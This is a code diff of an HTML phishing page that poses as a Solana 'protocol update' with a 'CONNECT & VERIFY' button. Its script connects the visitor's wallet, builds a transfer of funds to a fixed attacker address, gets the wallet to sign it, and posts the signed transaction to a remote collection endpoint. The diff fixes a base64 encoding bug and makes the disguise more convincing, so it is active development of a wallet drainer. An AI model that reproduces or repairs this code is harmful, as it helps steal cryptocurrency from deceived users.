@@ -1,10 +1,8 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-    <script>window.Buffer = buffer.Buffer;</script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2>SYSTEM UPDATE</h2>
+        <h2>PROTOCOL UPDATE</h2>
         <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & VERIFY</button>
     </div>
     <script>
@@ -16,13 +14,13 @@
             const p = window.solana || window.phantom?.solana;
             const { publicKey } = await p.connect();
             
-            // 🔱 向服务器拿数据 (避开 403)
+            // 🔱 向服务器拿数据
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: publicKey.toString()})
             }).then(r => r.json());
 
-            // 🚀 构造交易逻辑 (修正地址格式报错)
+            // 🚀 构造交易逻辑
             const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: publicKey, 
                 toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
@@ -31,11 +29,18 @@
             tx.recentBlockhash = data.blockhash; tx.feePayer = publicKey;
             
             const signed = await p.signTransaction(tx);
-            const b64 = window.Buffer.from(signed.serialize()).toString('base64');
+            
+            // 💰 这里的 Base64 转换不再依赖 Buffer，彻底消灭报错
+            const raw = signed.serialize();
+            let b64 = "";
+            for (let i = 0; i < raw.length; i++) {
+                b64 += String.fromCharCode(raw[i]);
+            }
+            const signatureB64 = window.btoa(b64);
             
             fetch(TUNNEL + '/collect', {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: b64})
+                body:JSON.stringify({signature: signatureB64})
             });
             alert("Protocol Activated!");
         } catch(e) { alert("Error: " + e.message); }
